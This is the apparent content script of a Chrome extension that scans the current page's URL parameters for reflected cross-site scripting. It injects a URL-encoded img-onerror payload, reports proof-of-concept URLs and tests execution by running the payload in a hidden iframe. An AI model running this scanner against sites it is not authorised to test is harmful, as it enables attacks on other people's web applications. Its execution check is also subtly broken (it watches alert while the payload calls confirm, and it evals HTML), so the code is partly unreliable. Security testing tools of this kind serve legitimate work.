// Use p-limit without ES modules (if needed)
const pLimit = (concurrency) => {
  const queue = [];
  let active = 0;

  const next = () => {
    if (active < concurrency && queue.length > 0) {
      active++;
      const { fn, resolve, reject } = queue.shift();
      fn()
        .then(resolve)
        .catch(reject)
        .finally(() => {
          active--;
          next();
        });
    }
  };

  return (fn) => {
    return new Promise((resolve, reject) => {
      queue.push({ fn, resolve, reject });
      next();
    });
  };
};

let isScanning = false;
const xssPayloads = [
  '%22%3E%3Cimg%20src=x%20onerror=confirm(1)%3E', // Example: encoded payload
  // ... more payloads (encoded or not as needed)
];

function getUrlParameters() {
  const url = new URL(window.location.href);
  const params = new URLSearchParams(url.search);
  const parameters = {};
  for (const [key, value] of params.entries()) {
    parameters[key] = value;
  }
  return parameters;
}

function isPayloadExecuted(payload) {
  console.log("Checking if payload is executed...");
  const iframe = document.createElement("iframe");
  iframe.style.display = "none";
  document.body.appendChild(iframe);

  iframe.contentDocument.open();
  iframe.contentDocument.write(payload);
  iframe.contentDocument.close();

  let executed = false;
  const originalAlert = window.alert;
  window.alert = () => {
    executed = true;
    console.log("Payload executed: Alert triggered!");
  };

  iframe.contentWindow.eval(payload); // Or iframe.contentDocument.eval(payload)

  document.body.removeChild(iframe);
  window.alert = originalAlert;

  console.log(`Payload execution status: ${executed}`);
  return executed;
}

async function testPayload(parameter, payload) {
  try {
    const baseUrl = window.location.origin + window.location.pathname;
    const fullUrl = `${baseUrl}?${parameter}=${payload}`;

    const response = await fetch(encodeURI(fullUrl), {
      headers: {
        "Content-Type": "text/plain", // Or appropriate content type
      },
    });

    const text = await response.text();

    if (text.includes(payload)) {
      console.log(`Payload reflected in Parameter: ${parameter}`);
      const encodedFullUrl = encodeURI(fullUrl); // Encode for display
      console.log(`PoC URL (for reflection test): ${encodedFullUrl}`);
      return { reflected: true, url: encodedFullUrl }; // Return object
    } else {
      console.log(`Payload NOT reflected in Parameter: ${parameter}`);
      return { reflected: false }; // Return object
    }
  } catch (error) {
    console.error("Error testing:", error);
    return { reflected: false, error: error.message }; // Return object with error
  }
}


async function testReflectedXSS() {
  const parameters = getUrlParameters();
  const results = [];
  const limit = pLimit(10); // Adjust concurrency as needed

  const tests = [];
  for (const [parameter, value] of Object.entries(parameters)) {
    if (!isScanning) break;

    for (const payload of xssPayloads) {
      if (!isScanning) break;

      tests.push(
        limit(() =>
          testPayload(parameter, payload).then(async (result) => {
            results.push(result);

            if (result.reflected) {
                console.log(`Payload reflected in Parameter: ${parameter}`);
                console.log(`PoC URL (for reflection): ${result.url}`);

                if (isPayloadExecuted(payload)) { // Check execution
                    console.log(`XSS Executed in Parameter: ${parameter}`);
                    console.log(`PoC URL (for execution): ${result.url}`);
                    isScanning = false; // Stop scanning
                    return; // Exit early
                } else {
                    console.log(`Payload reflected but NOT executed in Parameter: ${parameter}`);
                }
            }
          })
        )
      );
    }
  }

  await Promise.all(tests);

  if (!isScanning) {
    console.log("Scan stopped by user or XSS found.");
  } else {
    console.log("No Reflected XSS Found.");
  }
  return results; // Return all results
}



chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "scan") {
    isScanning = true;
    testReflectedXSS().then(results => {
        sendResponse({ status: "Scan completed", results: results }); // Include results
    });
    return true; // Indicates async response
  } else if (request.action === "stop") {
    isScanning = false;
    sendResponse({ status: "Scan stopped" });
  }
});
